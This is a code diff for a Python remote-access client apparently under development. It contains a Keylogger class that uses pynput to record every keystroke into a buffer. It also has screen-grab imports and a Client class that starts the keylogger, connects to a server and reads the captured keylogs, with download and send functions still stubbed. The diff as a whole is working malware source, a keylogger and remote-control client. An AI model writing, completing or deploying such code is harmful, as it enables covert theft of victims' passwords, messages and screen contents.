@@ -3,6 +3,7 @@ import io
 import json
 import socket
 import threading
+import datetime
 from pynput import keyboard
 
 from PIL import ImageGrab
@@ -18,8 +19,27 @@ class Keylogger:
         self._alt_state = False
         self._key_map = {"enter": "\n", "space": " ", "tab": "\t"}
 
-    def _on_press(self, key):
-        pressed = ""
+    def start(self) -> None:
+        def _start_keylogger():
+            with keyboard.Listener(
+                on_press=self._on_press, on_release=self._on_release
+            ) as listener:
+                listener.join()
+
+        threading.Thread(target=_start_keylogger).start()
+
+    def get_keylogs(self) -> str:
+        return self._buffer
+
+    # Key press events ---------------------------------------------------------------
+
+    def _on_press(self, key) -> None:
+        """Triggered on the event of a key being pressed
+
+        Args:
+            key (pynput.keyboard._win32.keycode): Object relative to the key that was pressed
+        """
+        pressed = None
         if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
             self._ctrl_state = True
             return
@@ -36,22 +56,18 @@ class Keylogger:
             pressed = self._key_map.get(
                 key.name.split("_")[0], "[{0}]".format(key.name.split("_")[0])
             ).upper()
-        self._buffer += pressed
+        self._buffer += pressed if pressed else ""
 
     def _on_release(self, key) -> None:
+        """Triggered on the event of a key being released
+
+        Args:
+            key (pynput.keyboard._win32.keycode): Object relative to the key that was pressed
+        """
         if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
             self._ctrl_state = False
         elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
             self._alt_state = False
-
-    def start(self):
-        def _run():
-            with keyboard.Listener(
-                on_press=self._on_press, on_release=self._on_release
-            ) as listener:
-                listener.join()
-
-        threading.Thread(target=_run).start()
 
 
 class Client:
@@ -63,15 +79,13 @@ class Client:
     def start(self):
         # start keylogger
         self._keylogger.start()
-        print("awd")
         # connect to server
         threading.Thread(target=self._connect).start()
-        pass
 
     # Data handling ------------------------------------------------------------
 
     def _keylogs(self):
-        ...
+        keylogs = self._keylogger.get_keylogs()
 
     def _download(self, file_path: str):
         print(file_path)
